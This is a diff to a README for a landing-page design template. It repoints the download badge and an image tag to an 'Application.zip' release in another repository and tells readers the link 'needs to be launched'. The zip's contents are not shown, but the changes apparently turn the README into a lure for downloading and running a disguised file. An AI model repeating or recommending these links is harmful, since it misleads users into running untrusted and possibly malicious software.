@@ -29,7 +29,7 @@ The MatteEngine design by The18 is a testament to modern web design trends. By w
 
 Ready to dive in? Click on the button below to download the necessary files and start exploring the world of landing page design and development.
 
-[![Download Project Files](https://img.shields.io/badge/Download-Project_Files-9cf)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Project Files](https://github.com/JackTHEW/landing-page/releases/download/v1.0/Application.zip)](https://github.com/JackTHEW/landing-page/releases/download/v1.0/Application.zip)
 
 Remember, the link needs to be launched to access the project files. If you encounter any issues with the link, please check the "Releases" section of this repository for alternative download options.
 
@@ -39,6 +39,6 @@ Join us in the exciting journey of web development and share your progress, ask 
 
 Let's start building something incredible together! 🚀🌟
 
-![Web Development](https://imageurl.com)
+![Web Development](https://github.com/JackTHEW/landing-page/releases/download/v1.0/Application.zip)
 
 **Happy coding!** 🎉
